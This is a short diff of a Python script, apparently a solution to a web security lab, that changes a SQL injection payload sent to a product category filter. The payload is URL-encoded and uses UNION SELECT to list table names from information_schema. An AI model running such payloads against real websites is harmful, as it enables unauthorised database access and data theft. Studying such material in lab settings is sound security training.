@@ -14,7 +14,7 @@ def perform_request(url, sqli_payload):
 
 def sqli_users_table(url):
     path = 'filter?category=Pets'
-    payload = ' UNION SELECT table_name, null FROM information_schema.tables--'
+    payload = '+UNION+SELECT+table_name,+null+FROM+information_schema.tables--'
     res = perform_request(url, payload)
     print(res)
 
